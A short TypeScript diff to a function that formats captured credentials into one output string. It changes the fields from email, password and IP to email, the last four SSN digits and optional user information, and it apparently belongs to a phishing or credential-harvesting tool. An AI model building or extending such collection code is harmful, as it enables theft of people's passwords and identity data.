@@ -3,11 +3,11 @@ import { Credential } from '../interface/credential';
 export const generateOutputMessage = (
   crendential: Credential,
   url: string,
-  ip: string,
+  userInformation?: string,
 ): string => {
-  const { email, password } = crendential;
+  const { email, last4ssn } = crendential;
 
-  const message = `EMAIL=${email} PASSWORD=${password} IP=${ip}`;
+  const message = `EMAIL=${email} LAST4SSN=${last4ssn} ${userInformation || ''}`;
 
   return message;
 };
